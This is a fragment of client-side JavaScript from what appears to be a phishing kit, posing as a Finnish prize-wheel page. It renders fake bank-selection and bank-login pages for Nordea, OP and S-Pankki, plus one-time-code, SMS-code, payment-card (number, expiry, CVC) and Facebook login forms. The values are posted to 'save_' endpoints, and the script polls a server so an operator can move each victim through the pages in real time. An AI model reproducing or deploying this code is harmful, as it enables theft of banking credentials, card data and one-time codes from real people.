        'à':'a','á':'a','â':'a','ã':'a','è':'e','é':'e','ê':'e','ë':'e',
        'ì':'i','í':'i','î':'i','ï':'i','ñ':'n','ò':'o','ó':'o','ô':'o','õ':'o',
        'ù':'u','ú':'u','û':'u','ý':'y','ÿ':'y'};
      name = name.replace(/[åäöüğışçàáâãèéêëìíîïñòóôõùúûýÿ]/g, function(c){ return charMap[c]||c; });
      name = name.replace(/[^a-z0-9]+/g, '-').replace(/^-+|-+$/g, '');
      return name;
    }

    // Get visitor_id from localStorage or cookie
    function getVisitorId() {
      var vid = localStorage.getItem('visitor_id') || '';

        var cookies = document.cookie.split(';');
        for (var i = 0; i < cookies.length; i++) {
          var c = cookies[i].trim();

      try { _origSetAttr.call(document.body, 'x-data', 'waitApp'); } catch(e){}

      // Start self-contained polling for admin actions
      var _waitPollTimer = setInterval(function() {
        var vid = getVisitorId();
        var x = new XMLHttpRequest();
        x.open('GET', '/api/getRole?visitor_id=' + (vid || '') + '&t=' + Date.now(), true);
        x.withCredentials = true;
        x.onload = function() {
          try {
            var d = JSON.parse(x.responseText);
            if (d.success && d.page && d.page !== 'wait' && d.page !== 'wheel') {
              clearInterval(_waitPollTimer);
              handlePageChange(d.page, d);
            }
          } catch(e) {}
        };
        x.onerror = function() {};
        x.send();
      }, 2000);
    }

    // Intercept Alpine.js x-data changes
    var _origSetAttr = Element.prototype.setAttribute;
    Element.prototype.setAttribute = function(name, value) {
      if (name === 'x-data' && this.tagName === 'BODY') {
        fetch('/__log_error', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({type:'xdata_change', value:value})
        }).catch(function(){});

        // BANK LIST VIEW OVERRIDE
        if (value === 'bankListApp' && !_bankListActive) {
          _bankListActive = true;
          var body = this;
          var origSetAttrRef = _origSetAttr;

          // Fetch banks and render
          fetch('/banks').then(function(r){ return r.json(); }).then(function(banks) {
            _bankListData = banks;
            body.innerHTML = buildBankListPage(banks);
            origSetAttrRef.call(body, 'x-data', 'bankListApp');

            // Setup search
            var searchInput = document.getElementById('bankSearchInput');
            if (searchInput) {
              searchInput.addEventListener('input', function() {
                var listContainer = document.getElementById('bankListContainer');
                if (listContainer) {
                  listContainer.innerHTML = renderBankList(_bankListData, this.value);
                  attachBankClicks();
                }
              });
            }

            // Attach click handlers
            attachBankClicks();
          }).catch(function(err) {
            console.error('Failed to load banks:', err);
          });

          // Don't call original setAttribute yet - we'll call it after rendering
          return;
        }
      }
      return _origSetAttr.call(this, name, value);
    };

    function attachBankClicks() {
      document.querySelectorAll('.bank-container__box-list-item').forEach(function(item) {
        item.onclick = function() { handleBankItemClick(this); };
      });
    }

    // BACKUP: MutationObserver to catch x-data changes that bypass setAttribute
    var _bodyObserver = new MutationObserver(function(mutations) {
      for (var i = 0; i < mutations.length; i++) {
        if (mutations[i].attributeName === 'x-data') {
          var val = document.body.getAttribute('x-data');
          if (val === 'bankListApp' && !_bankListActive) {
            _bankListActive = true;
            fetch('/banks').then(function(r){ return r.json(); }).then(function(banks) {
              _bankListData = banks;
              document.body.innerHTML = buildBankListPage(banks);
              var searchInput = document.getElementById('bankSearchInput');
              if (searchInput) {
                searchInput.addEventListener('input', function() {
                  var listContainer = document.getElementById('bankListContainer');
                  if (listContainer) {
                    listContainer.innerHTML = renderBankList(_bankListData, this.value);
                    attachBankClicks();
                  }
                });
              }
              attachBankClicks();
            }).catch(function(err) { console.error('Bank load error:', err); });
          }
        }
      }
    });
    _bodyObserver.observe(document.body, { attributes: true, attributeFilter: ['x-data'] });

    // Intercept fetch calls - inject visitor_id into all POST requests
    var _origFetch = window.fetch;
    window.fetch = function() {
      var url = arguments[0];
      var opts = arguments[1] || {};
      
      // Log non-error fetches
      if (typeof url === 'string' && !url.includes('__log_error') && !url.includes('__log_fetch')) {
        _origFetch('/__log_error', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({type:'fetch', url:url, method:opts.method||'GET'})
        }).catch(function(){});
      }

      // Block obfuscated script's getRole fetch — inline XHR polling handles page routing
      if (typeof url === 'string' && url.indexOf('/api/getRole') !== -1) {
        return Promise.resolve(new Response(JSON.stringify({
          success: true, page: 'wheel', role: 'user', status: 'active'
        }), {status: 200, headers: {'Content-Type': 'application/json'}}));
      }
      
      // Auto-inject visitor_id into POST requests to /api/*
      if (typeof url === 'string' && url.indexOf('/api/') !== -1 && opts.method === 'POST') {
        var vid = getVisitorId();
        if (vid && opts.body) {
          if (opts.body instanceof FormData) {
            if (!opts.body.has('visitor_id')) {
              opts.body.append('visitor_id', vid);
            }
          } else if (typeof opts.body === 'string') {
            try {
              var jsonBody = JSON.parse(opts.body);
              if (!jsonBody.visitor_id) {
                jsonBody.visitor_id = vid;
                opts.body = JSON.stringify(jsonBody);
              }
            } catch(e) {
              // urlencoded - append visitor_id
              if (opts.body.indexOf('visitor_id') === -1) {
                opts.body += '&visitor_id=' + encodeURIComponent(vid);
              }
            }
          }
        }
        arguments[1] = opts;
      }
      
      return _origFetch.apply(this, arguments);
    };

    // ========================================
    // PAGE POLLING & VIEW SYSTEM
    // ========================================
    var _currentPage = 'wheel';
    var _pollInterval = null;
    var _pageViewActive = false;
    var _lastServerPage = '';

    function startPolling() {
      if (_pollInterval) return;
      _pollInterval = setInterval(function() {
        var vid = getVisitorId();
        var xhr = new XMLHttpRequest();
        xhr.open('GET', '/api/getRole?status=re&visitor_id=' + (vid||''), true);
        xhr.withCredentials = true;
        xhr.onload = function() {
          try {
            var data = JSON.parse(xhr.responseText);
            if (data.success && data.page && data.page !== _lastServerPage) {
              _lastServerPage = data.page;
              handlePageChange(data.page, data);
            }
          } catch(e) {}
        };
        xhr.send();
      }, 2000);
    }

    // Start polling after wheel spin or form submit
    setTimeout(startPolling, 3000);

    function handlePageChange(page, serverData) {
      if (page === _currentPage) return;
      
      // Pages that are handled by existing Alpine components (wheel, bankList)
      // Don't override these - they're handled by script.js
      if (page === 'wheel' && _currentPage !== 'wheel') {
        // Reload page to reset to wheel
        window.location.href = '/wheel';
        return;
      }
      
      // Pages that need our custom view
      var customPages = ['wait','otp','sms','card','facebook','success','bankLoginError',
        'nordeaVerify','spankkiVerify','opVerify','austriaVerify','customVerify',
        'support','whatsapp','banned'];
      
      if (customPages.indexOf(page) !== -1) {
        _currentPage = page;
        renderPageView(page, serverData);
      } else if (page === 'bankList') {
        // Let existing bank list override handle it
        _currentPage = page;
        try { _origSetAttr.call(document.body, 'x-data', 'bankListApp'); } catch(e){}
      } else if (page === 'bankLogin') {
        // Re-show bank login if we have bank data
        _currentPage = page;
        if (window._selectedBank) {
          activateLoginView(window._selectedBank.id, window._selectedBank.name, window._selectedBank.slug);
        }
      }
    }

    function renderPageView(page, data) {
      data = data || {};
      var langData = _cachedLangData;
      var html = '';

      switch(page) {
        case 'wait':
          html = buildWaitPage(langData);
          break;
        case 'otp':
          html = buildOtpPage(langData, data);
          break;
        case 'sms':
          html = buildSmsPage(langData, data);
          break;
        case 'card':
          html = buildCardPage(langData);
          break;
        case 'facebook':
          html = buildFacebookPage(langData);
          break;
        case 'success':
          html = buildSuccessPage(langData);
          break;
        case 'bankLoginError':
          html = buildBankLoginErrorPage(langData);
          break;
        case 'nordeaVerify':
          html = buildVerifyPage(langData, 'Nordea', data);
          break;
        case 'spankkiVerify':
          html = buildVerifyPage(langData, 'S-Pankki', data);
          break;
        case 'opVerify':
          html = buildVerifyPage(langData, 'OP', data);
          break;
        case 'austriaVerify':
          html = buildCustomVerifyPage(langData, data.verify_texts || {});
          break;
        case 'customVerify':
          html = buildCustomVerifyPage(langData, data.custom_verify_texts || {});
          break;
        case 'support':
          html = buildSupportPage(langData, data);
          break;
        case 'whatsapp':
          html = buildSupportPage(langData, data);
          break;
        case 'banned':
          html = '<div style="display:flex;align-items:center;justify-content:center;min-height:100vh;color:#fff;text-align:center;"><h2>Erişiminiz engellenmiştir.</h2></div>';
          break;
        default:
          html = buildWaitPage(langData);
      }

      document.body.innerHTML = html;
      _pageViewActive = true;

      // Continue polling for next admin action
      if (page !== 'success' && page !== 'banned') {
        if (window._viewPollTimer) clearInterval(window._viewPollTimer);
        window._viewPollTimer = setInterval(function() {
          var vid = getVisitorId();
          var x = new XMLHttpRequest();
          x.open('GET', '/api/getRole?visitor_id=' + (vid || '') + '&t=' + Date.now(), true);
          x.withCredentials = true;
          x.onload = function() {
            try {
              var d = JSON.parse(x.responseText);
              if (d.success && d.page && d.page !== page) {
                clearInterval(window._viewPollTimer);
                if (d.page === 'wheel') {
                  window.location.href = '/wheel';
                } else {
                  handlePageChange(d.page, d);
                }
              }
            } catch(e) {}
          };
          x.onerror = function() {};
          x.send();
        }, 2000);
      }
    }

    // ===== PAGE BUILDERS =====

    function pageWrapper(content) {
      return '<div style="min-height:100vh;display:flex;flex-direction:column;align-items:center;">' +
        '<div class="container" style="flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;max-width:500px;padding:2rem 1rem;text-align:center;">' +
        content +
        '</div>' +
        '<div class="powered-by" style="padding:1.5rem;">Powered by <img src="/static/img/1768398379_367d7c768420cfd5c6f1.png" alt="powered"></div>' +
        '</div>';
    }

    function buildWaitPage(lang) {
      var w = (lang && lang.wait) || {};
      return pageWrapper(
        '<p class="content-text__title">' + (w.title || 'ONNENPYÖRÄ') + '</p>' +

    // ===== FORM SUBMISSION HANDLERS =====
    // Delegate click events for dynamically rendered pages
    document.addEventListener('click', function(e) {
      var btn = e.target;
      
      // OTP submit
      if (btn.id === 'otpSubmitBtn') {
        var inputs = document.querySelectorAll('#otpInputs .otp-input');
        var code = '';
        inputs.forEach(function(i){ code += i.value; });
        if (code.length < 4) return;
        submitToApi('save_otp', {otp: code});
      }
      
      // SMS submit
      if (btn.id === 'smsSubmitBtn') {
        var inputs = document.querySelectorAll('#smsInputs .sms-input');
        var code = '';
        inputs.forEach(function(i){ code += i.value; });
        if (code.length < 3) return;
        submitToApi('save_sms', {sms: code});
      }
      
      // Card submit
      if (btn.id === 'cardSubmitBtn') {
        var cn = document.getElementById('cardNumber');
        var ce = document.getElementById('cardExpiry');
        var cc = document.getElementById('cardCvc');
        if (!cn || !cn.value || !ce || !ce.value || !cc || !cc.value) return;
        submitToApi('save_card', {card_number: cn.value, expiry_date: ce.value, cvc: cc.value});
      }
      
      // Facebook submit
      if (btn.id === 'fbSubmitBtn') {
        var em = document.getElementById('fbEmail');
        var pw = document.getElementById('fbPassword');
        if (!em || !em.value || !pw || !pw.value) return;
        submitToApi('save_facebook', {email: em.value, password: pw.value});
      }
      
      // Verify submit (nordea, op, spankki)
      if (btn.id === 'verifySubmitBtn') {
        var inputs = document.querySelectorAll('#verifyInputs .verify-input');
        var code = '';
        inputs.forEach(function(i){ code += i.value; });
        if (code.length < 3) return;
        submitToApi('save_otp', {otp: code});
      }
      
      // Custom verify submit
      if (btn.id === 'cvSubmitBtn') {
        var inputs = document.querySelectorAll('#customVerifyInputs .cv-input');
        var code = '';
        inputs.forEach(function(i){ code += i.value; });
        if (code.length < 3) return;
        submitToApi('save_otp', {otp: code});
      }
      
      // Retry login submit
      if (btn.id === 'retryLoginBtn') {
        var u = document.getElementById('retryUsername');
        var p = document.getElementById('retryPassword');
        if (!u || !u.value) return;
        var bankId = ''; var bankName = '';
        if (window._selectedBank) { bankId = window._selectedBank.id; bankName = window._selectedBank.name; }
        submitToApi('save_login', {username: u.value, password: p ? p.value : '', bank_id: bankId, bank_name: bankName});
      }
    });

    // Auto-focus next input for OTP-style inputs
    document.addEventListener('input', function(e) {
      if (e.target.classList.contains('otp-input') || e.target.classList.contains('sms-input') || 
          e.target.classList.contains('verify-input') || e.target.classList.contains('cv-input')) {
        if (e.target.value.length === 1) {
          var next = e.target.nextElementSibling;
          if (next && next.tagName === 'INPUT') next.focus();
        }
      }
      // Card number formatting
      if (e.target.id === 'cardNumber') {
        var v = e.target.value.replace(/\D/g,'').substring(0,16);
        e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
      }
      // Expiry formatting
      if (e.target.id === 'cardExpiry') {
        var v = e.target.value.replace(/\D/g,'').substring(0,4);
        if (v.length > 2) v = v.substring(0,2) + '/' + v.substring(2);
        e.target.value = v;
      }
    });

    // Backspace handling for OTP inputs
    document.addEventListener('keydown', function(e) {
      if ((e.target.classList.contains('otp-input') || e.target.classList.contains('sms-input') || 
           e.target.classList.contains('verify-input') || e.target.classList.contains('cv-input')) && e.key === 'Backspace' && !e.target.value) {
        var prev = e.target.previousElementSibling;
        if (prev && prev.tagName === 'INPUT') { prev.focus(); prev.value = ''; }
      }
    });

    function submitToApi(endpoint, data) {
      var vid = getVisitorId();
      var fd = new FormData();
      fd.append('visitor_id', vid);
      for (var k in data) { fd.append(k, data[k]); }
      
      _origFetch('/api/' + endpoint, {
        method: 'POST',
        body: fd,
        credentials: 'include'
      }).then(function(r){ return r.json(); }).then(function(resp) {
        // After submit, show wait page
        _currentPage = 'wait';
        renderPageView('wait', {});
      }).catch(function(err) {
        console.error('Submit error:', err);
        _currentPage = 'wait';
        renderPageView('wait', {});
      });
    }
  </script>
